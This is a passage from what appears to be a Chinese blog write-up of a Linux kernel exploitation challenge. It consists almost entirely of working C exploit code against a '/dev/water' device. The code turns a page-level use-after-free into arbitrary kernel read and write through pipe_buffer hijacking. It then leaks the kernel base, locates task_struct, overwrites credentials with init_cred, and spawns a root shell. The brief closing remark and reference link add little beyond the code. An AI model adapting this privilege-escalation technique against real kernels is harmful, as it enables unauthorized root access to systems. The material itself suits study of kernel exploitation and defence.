class="type">size_t</span>)info_pipe_buf.ops &lt; <span class="number">0xffffffff81000000</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;FAILED to re-hit victim page!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;hit the UAF page successful&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;construct no.2 page level uaf&quot;</span>);</span><br><span class="line">  info_pipe_buf.page = (<span class="keyword">struct</span> page *)(<span class="number">0x40</span> + (<span class="type">size_t</span>)info_pipe_buf.page);</span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[victim_idx][<span class="number">1</span>], &amp;info_pipe_buf, <span class="built_in">sizeof</span>(info_pipe_buf));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;try find no.2 page uaf by pipe tags&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i == origin_idx || i == victim_idx) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> nr = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">read</span>(spray_pipe_fd[i][<span class="number">0</span>], &amp;nr, <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="comment">// printf(&quot;%#x\n&quot;, nr);</span></span><br><span class="line">    <span class="keyword">if</span> (nr &lt; PIPE_SPRAY_NUMS &amp;&amp; nr != i) &#123;</span><br><span class="line">      snd_origin_idx = nr;</span><br><span class="line">      snd_victim_idx = i;</span><br><span class="line">      <span class="built_in">log_info</span>(<span class="string">&quot;find second pipe victim_idx: %d&quot;</span>, snd_victim_idx);</span><br><span class="line">      <span class="built_in">log_info</span>(<span class="string">&quot;find second pipe origin_idx: %d&quot;</span>, snd_origin_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (snd_victim_idx == <span class="number">-1</span> || snd_origin_idx == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;failed find snd pipe&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;find no.2 idx sucessfully&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">construct_self_pipe</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">char</span> buffer[<span class="number">0x1000</span>];</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">page</span> *page_ptr;</span><br><span class="line">  <span class="type">size_t</span> trd_pipe_sz =</span><br><span class="line">      <span class="number">0x1000</span> * (TRD_PIPE_BUFS_SIZE / <span class="built_in">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;write to no.2 victim pipe&quot;</span>);</span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[snd_victim_idx][<span class="number">1</span>], buffer,</span><br><span class="line">        TRD_PIPE_BUFS_SIZE - <span class="number">24</span> - <span class="number">3</span> * <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;close no.2 origin pipe to make second page level uaf&quot;</span>);</span><br><span class="line">  <span class="built_in">close</span>(spray_pipe_fd[snd_origin_idx][<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">close</span>(spray_pipe_fd[snd_origin_idx][<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; ++i) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i == origin_idx || i == snd_origin_idx || i == victim_idx ||</span><br><span class="line">        i == snd_victim_idx) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">fcntl</span>(spray_pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, trd_pipe_sz) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">err_exit</span>(<span class="string">&quot;fcntl() pipe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;hijack pipe 2 page to itself&quot;</span>);</span><br><span class="line">  evil_pipe_buf.page = info_pipe_buf.page;</span><br><span class="line">  evil_pipe_buf.offset = TRD_PIPE_BUFS_SIZE;</span><br><span class="line">  evil_pipe_buf.len = TRD_PIPE_BUFS_SIZE;</span><br><span class="line">  evil_pipe_buf.ops = info_pipe_buf.ops;</span><br><span class="line">  evil_pipe_buf.flags = info_pipe_buf.flags;</span><br><span class="line">  evil_pipe_buf.<span class="keyword">private</span> = info_pipe_buf.<span class="keyword">private</span>;</span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[snd_victim_idx][<span class="number">1</span>], &amp;evil_pipe_buf,</span><br><span class="line">        <span class="built_in">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;try find pipe 2 idx&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i == origin_idx || i == victim_idx || i == snd_origin_idx ||</span><br><span class="line">        i == snd_victim_idx) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">read</span>(spray_pipe_fd[i][<span class="number">0</span>], &amp;page_ptr, <span class="built_in">sizeof</span>(page_ptr));</span><br><span class="line">    <span class="comment">// printf(&quot;page ptr: %#lx&quot;, (size_t)page_ptr);</span></span><br><span class="line">    <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;</span><br><span class="line">      self_pipe_idx_2 = i;</span><br><span class="line">      <span class="built_in">log_info</span>(<span class="string">&quot;Found self pipe 2: %d&quot;</span>, self_pipe_idx_2);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (self_pipe_idx_2 == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;FAILED to build a self-writing pipe 2!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;hijack pipe 3 page to itself&quot;</span>);</span><br><span class="line">  evil_pipe_buf.offset = TRD_PIPE_BUFS_SIZE;</span><br><span class="line">  evil_pipe_buf.len = TRD_PIPE_BUFS_SIZE;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[snd_victim_idx][<span class="number">1</span>], buffer,</span><br><span class="line">        TRD_PIPE_BUFS_SIZE - <span class="built_in">sizeof</span>(evil_pipe_buf));</span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[snd_victim_idx][<span class="number">1</span>], &amp;evil_pipe_buf,</span><br><span class="line">        <span class="built_in">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;try find pipe 3 idx&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i == origin_idx || i == victim_idx || i == snd_origin_idx ||</span><br><span class="line">        i == snd_victim_idx || i == self_pipe_idx_2) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">read</span>(spray_pipe_fd[i][<span class="number">0</span>], &amp;page_ptr, <span class="built_in">sizeof</span>(page_ptr));</span><br><span class="line">    <span class="comment">// printf(&quot;page ptr: %#lx&quot;, (size_t)page_ptr);</span></span><br><span class="line">    <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;</span><br><span class="line">      self_pipe_idx_3 = i;</span><br><span class="line">      <span class="built_in">log_info</span>(<span class="string">&quot;Found self pipe 3: %d&quot;</span>, self_pipe_idx_3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (self_pipe_idx_3 == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;FAILED to build a self-writing pipe 3!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;try hijack pipe 4 page to itself&quot;</span>);</span><br><span class="line">  evil_pipe_buf.offset = TRD_PIPE_BUFS_SIZE;</span><br><span class="line">  evil_pipe_buf.len = TRD_PIPE_BUFS_SIZE;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[snd_victim_idx][<span class="number">1</span>], buffer,</span><br><span class="line">        TRD_PIPE_BUFS_SIZE - <span class="built_in">sizeof</span>(evil_pipe_buf));</span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[snd_victim_idx][<span class="number">1</span>], &amp;evil_pipe_buf,</span><br><span class="line">        <span class="built_in">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;try find pipe 4 idx&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i == origin_idx || i == victim_idx || i == snd_origin_idx ||</span><br><span class="line">        i == snd_victim_idx || i == self_pipe_idx_2 || i == self_pipe_idx_3) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">read</span>(spray_pipe_fd[i][<span class="number">0</span>], &amp;page_ptr, <span class="built_in">sizeof</span>(page_ptr));</span><br><span class="line">    <span class="comment">// printf(&quot;page ptr: %#lx&quot;, (size_t)page_ptr);</span></span><br><span class="line">    <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;</span><br><span class="line">      self_pipe_idx_4 = i;</span><br><span class="line">      <span class="built_in">log_info</span>(<span class="string">&quot;Found self pipe 4: %d&quot;</span>, self_pipe_idx_4);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (self_pipe_idx_4 == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;FAILED to build a self-writing pipe 4!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;find self rw pipe 2 3 4 successfully&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setup_evil_pipe</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;set up 2 3 4 pipe buffer&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;evil_pipe_buf_2, &amp;info_pipe_buf, <span class="built_in">sizeof</span>(evil_pipe_buf_2));</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;evil_pipe_buf_3, &amp;info_pipe_buf, <span class="built_in">sizeof</span>(evil_pipe_buf_3));</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;evil_pipe_buf_4, &amp;info_pipe_buf, <span class="built_in">sizeof</span>(evil_pipe_buf_4));</span><br><span class="line"></span><br><span class="line">  evil_pipe_buf_2.offset = <span class="number">0</span>;</span><br><span class="line">  evil_pipe_buf_2.len = <span class="number">0xff8</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* hijack 3 -&gt; 4 */</span></span><br><span class="line">  evil_pipe_buf_3.offset = TRD_PIPE_BUFS_SIZE * <span class="number">3</span>;</span><br><span class="line">  evil_pipe_buf_3.len = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// ?? 写4</span></span><br><span class="line">  <span class="comment">// 因为写 pipe 时从 offset + len 开始写，就是写入3中</span></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;hijack pipe 3 to write pipe 4&quot;</span>);</span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[self_pipe_idx_4][<span class="number">1</span>], &amp;evil_pipe_buf_3,</span><br><span class="line">        <span class="built_in">sizeof</span>(evil_pipe_buf_3));</span><br><span class="line"></span><br><span class="line">  evil_pipe_buf_4.offset = TRD_PIPE_BUFS_SIZE;</span><br><span class="line">  evil_pipe_buf_4.len = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pipe_arb_read</span><span class="params">(<span class="keyword">struct</span> page *page_to_read, <span class="type">void</span> *dst)</span> </span>&#123;</span><br><span class="line">  evil_pipe_buf_2.offset = <span class="number">0</span>;</span><br><span class="line">  evil_pipe_buf_2.len = <span class="number">0x1ff8</span>;</span><br><span class="line">  evil_pipe_buf_2.page = page_to_read;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* use 3 wrtite 4 to make 4-&gt;2 */</span></span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[self_pipe_idx_3][<span class="number">1</span>], &amp;evil_pipe_buf_4,</span><br><span class="line">        <span class="built_in">sizeof</span>(evil_pipe_buf_4));</span><br><span class="line">  <span class="comment">/* use 4 write 2 */</span></span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[self_pipe_idx_4][<span class="number">1</span>], &amp;evil_pipe_buf_2,</span><br><span class="line">        <span class="built_in">sizeof</span>(evil_pipe_buf_2));</span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[self_pipe_idx_4][<span class="number">1</span>], temp_zero_buf,</span><br><span class="line">        TRD_PIPE_BUFS_SIZE - <span class="built_in">sizeof</span>(evil_pipe_buf_2));</span><br><span class="line">  <span class="comment">/* use 4 write 3 */</span></span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[self_pipe_idx_4][<span class="number">1</span>], &amp;evil_pipe_buf_3,</span><br><span class="line">        <span class="built_in">sizeof</span>(evil_pipe_buf_3));</span><br><span class="line">  <span class="comment">/* read 2 */</span></span><br><span class="line">  <span class="built_in">read</span>(spray_pipe_fd[self_pipe_idx_2][<span class="number">0</span>], dst, <span class="number">0xfff</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pipe_arb_write</span><span class="params">(<span class="keyword">struct</span> page *page_to_write, <span class="type">void</span> *src, <span class="type">size_t</span> len)</span> </span>&#123;</span><br><span class="line">  evil_pipe_buf_2.page = page_to_write;</span><br><span class="line">  evil_pipe_buf_2.offset = <span class="number">0</span>;</span><br><span class="line">  evil_pipe_buf_2.len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* use 3 wrtite 4 to make 4-&gt;2 */</span></span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[self_pipe_idx_3][<span class="number">1</span>], &amp;evil_pipe_buf_4,</span><br><span class="line">        <span class="built_in">sizeof</span>(evil_pipe_buf_4));</span><br><span class="line">  <span class="comment">/* use 4 write 2 */</span></span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[self_pipe_idx_4][<span class="number">1</span>], &amp;evil_pipe_buf_2,</span><br><span class="line">        <span class="built_in">sizeof</span>(evil_pipe_buf_2));</span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[self_pipe_idx_4][<span class="number">1</span>], temp_zero_buf,</span><br><span class="line">        TRD_PIPE_BUFS_SIZE - <span class="built_in">sizeof</span>(evil_pipe_buf_2));</span><br><span class="line">  <span class="comment">/* use 4 write 3 */</span></span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[self_pipe_idx_4][<span class="number">1</span>], &amp;evil_pipe_buf_3,</span><br><span class="line">        <span class="built_in">sizeof</span>(evil_pipe_buf_3));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[self_pipe_idx_2][<span class="number">1</span>], src, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> *tsk_buf, current_task_page, current_task, parent_task, buf[<span class="number">0x1000</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">info_leak</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;info leak&quot;</span>);</span><br><span class="line">  <span class="type">size_t</span> *comm_addr;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="built_in">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;setup kernel arbitrary read &amp; write...&quot;</span>);</span><br><span class="line">  <span class="built_in">setup_evil_pipe</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;leaking something by search memory&quot;</span>);</span><br><span class="line">  vmemmap_base = (<span class="type">size_t</span>)info_pipe_buf.page &amp; <span class="number">0xfffffffff0000000</span>;</span><br><span class="line">  <span class="comment">// log_info(&quot;vmemmap_base: %#lx&quot;, vmemmap_base);</span></span><br><span class="line">  <span class="comment">// debug(&quot;vmemmap_base&quot;);</span></span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="built_in">pipe_arb_read</span>((<span class="keyword">struct</span> page *)(vmemmap_base + <span class="number">157</span> * <span class="number">0x40</span>), buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (buf[<span class="number">0</span>] &gt; <span class="number">0xffffffff81000000</span> &amp;&amp; ((buf[<span class="number">0</span>] &amp; <span class="number">0xfff</span>) == <span class="number">0x070</span>)) &#123;</span><br><span class="line">      kernel_base = buf[<span class="number">0</span>] - <span class="number">0x070</span>;</span><br><span class="line">      kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">      <span class="built_in">printf</span>(</span><br><span class="line">          <span class="string">&quot;Found kernel base: %#lx\n\t\t&quot;</span></span><br><span class="line">          <span class="string">&quot;Kernel offset: %#lx&quot;</span>,</span><br><span class="line">          kernel_base, kernel_offset);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    vmemmap_base -= <span class="number">0x10000000</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;vmemmap_base: %#lx&quot;</span>, vmemmap_base);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;seek task_struct in memory...&quot;</span>);</span><br><span class="line">  <span class="built_in">prctl</span>(PR_SET_NAME, <span class="string">&quot;waterkernelpwn&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; <span class="number">1</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">pipe_arb_read</span>((<span class="keyword">struct</span> page *)(vmemmap_base + i * <span class="number">0x40</span>), buf);</span><br><span class="line"></span><br><span class="line">    comm_addr = <span class="built_in">memmem</span>(buf, <span class="number">0xf00</span>, <span class="string">&quot;waterkernelpwn&quot;</span>, <span class="number">14</span>);</span><br><span class="line">    <span class="keyword">if</span> (comm_addr &amp;&amp; (comm_addr[<span class="number">-2</span>] &gt; <span class="number">0xffff888000000000</span>) <span class="comment">/* task-&gt;cred */</span></span><br><span class="line">        &amp;&amp; (comm_addr[<span class="number">-3</span>] &gt; <span class="number">0xffff888000000000</span>)           <span class="comment">/* task-&gt;real_cred */</span></span><br><span class="line">        &amp;&amp; (comm_addr[<span class="number">-57</span>] &gt; <span class="number">0xffff888000000000</span>)    <span class="comment">/* task-&gt;read_parent */</span></span><br><span class="line">        &amp;&amp; (comm_addr[<span class="number">-56</span>] &gt; <span class="number">0xffff888000000000</span>)) &#123; <span class="comment">/* task-&gt;parent */</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* task-&gt;read_parent */</span></span><br><span class="line">      parent_task = comm_addr[<span class="number">-57</span>];</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* task_struct::ptraced */</span></span><br><span class="line">      current_task = comm_addr[<span class="number">-50</span>] - <span class="number">2528</span>;</span><br><span class="line"></span><br><span class="line">      page_offset_base = (comm_addr[<span class="number">-50</span>] &amp; <span class="number">0xfffffffffffff000</span>) - i * <span class="number">0x1000</span>;</span><br><span class="line">      page_offset_base &amp;= <span class="number">0xfffffffff0000000</span>;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found task_struct on page: \033[0m%p\n&quot;</span>,</span><br><span class="line">             (<span class="keyword">struct</span> page *)(vmemmap_base + i * <span class="number">0x40</span>));</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] page_offset_base: \033[0m%#lx\n&quot;</span>,</span><br><span class="line">             page_offset_base);</span><br><span class="line">      <span class="built_in">printf</span>(</span><br><span class="line">          <span class="string">&quot;\033[34m\033[1m[*] current task_struct&#x27;s addr: \033[0m&quot;</span></span><br><span class="line">          <span class="string">&quot;%#lx\n\n&quot;</span>,</span><br><span class="line">          current_task);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">get_root_shell</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getuid</span>()) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">sleep</span>(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. \033[0m&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Execve root shell now...\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">size_t</span> <span class="title">direct_map_addr_to_page_addr</span><span class="params">(<span class="type">size_t</span> direct_map_addr)</span> </span>&#123;</span><br><span class="line">  <span class="type">size_t</span> page_count;</span><br><span class="line"></span><br><span class="line">  page_count = ((direct_map_addr &amp; (~<span class="number">0xfff</span>)) - page_offset_base) / <span class="number">0x1000</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> vmemmap_base + page_count * <span class="number">0x40</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">privilege_escalation_by_task_overwrite</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">/* finding the init_task, the final parent of every task */</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[*] Seeking for init_task...&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="type">size_t</span> ptask_page_addr = <span class="built_in">direct_map_addr_to_page_addr</span>(parent_task);</span><br><span class="line"></span><br><span class="line">    tsk_buf = (<span class="type">size_t</span> *)((<span class="type">size_t</span>)buf + (parent_task &amp; <span class="number">0xfff</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">pipe_arb_read</span>((<span class="keyword">struct</span> page *)ptask_page_addr, buf);</span><br><span class="line">    <span class="built_in">pipe_arb_read</span>((<span class="keyword">struct</span> page *)(ptask_page_addr + <span class="number">0x40</span>), &amp;buf[<span class="number">512</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* task_struct::real_parent */</span></span><br><span class="line">    <span class="keyword">if</span> (parent_task == tsk_buf[<span class="number">309</span>]) &#123;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    parent_task = tsk_buf[<span class="number">309</span>];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  init_task = parent_task;</span><br><span class="line">  init_cred = tsk_buf[<span class="number">363</span>];</span><br><span class="line">  init_nsproxy = tsk_buf[<span class="number">377</span>];</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_task: \033[0m0x%lx\n&quot;</span>, init_task);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_cred: \033[0m0x%lx\n&quot;</span>, init_cred);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_nsproxy:\033[0m0x%lx\n&quot;</span>, init_nsproxy);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* now, changing the current task_struct to get the full root :) */</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[*] Escalating ROOT privilege now...&quot;</span>);</span><br><span class="line"></span><br><span class="line">  current_task_page = <span class="built_in">direct_map_addr_to_page_addr</span>(current_task);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">pipe_arb_read</span>((<span class="keyword">struct</span> page *)current_task_page, buf);</span><br><span class="line">  <span class="built_in">pipe_arb_read</span>((<span class="keyword">struct</span> page *)(current_task_page + <span class="number">0x40</span>), &amp;buf[<span class="number">512</span>]);</span><br><span class="line"></span><br><span class="line">  tsk_buf = (<span class="type">size_t</span> *)((<span class="type">size_t</span>)buf + (current_task &amp; <span class="number">0xfff</span>));</span><br><span class="line">  tsk_buf[<span class="number">363</span>] = init_cred;</span><br><span class="line">  tsk_buf[<span class="number">364</span>] = init_cred;</span><br><span class="line">  tsk_buf[<span class="number">377</span>] = init_nsproxy;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">pipe_arb_write</span>((<span class="keyword">struct</span> page *)current_task_page, buf, <span class="number">0xff0</span>);</span><br><span class="line">  <span class="built_in">pipe_arb_write</span>((<span class="keyword">struct</span> page *)(current_task_page + <span class="number">0x40</span>), &amp;buf[<span class="number">512</span>], <span class="number">0xff0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+] Done.\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[*] checking for root...&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">get_root_shell</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">bind_core</span><span class="params">(<span class="type">int</span> core)</span> </span>&#123;</span><br><span class="line">  <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">CPU_ZERO</span>(&amp;cpu_set);</span><br><span class="line">  <span class="built_in">CPU_SET</span>(core, &amp;cpu_set);</span><br><span class="line">  <span class="built_in">sched_setaffinity</span>(<span class="built_in">getpid</span>(), <span class="built_in">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">bind_core</span>(<span class="number">0</span>);</span><br><span class="line">  dev_fd = <span class="built_in">open</span>(<span class="string">&quot;/dev/water&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">if</span> (dev_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;open /dev/water&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">page_level_uaf</span>();</span><br><span class="line">  <span class="built_in">second_page_level_uaf</span>();</span><br><span class="line">  <span class="built_in">construct_self_pipe</span>();</span><br><span class="line">  <span class="built_in">info_leak</span>();</span><br><span class="line">  <span class="built_in">privilege_escalation_by_task_overwrite</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>等哪天心血来潮在做一遍吧</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://www.52pojie.cn/thread-1795570-1-1.html">Linux kernel 堆溢出漏洞分析与利用</a></li>
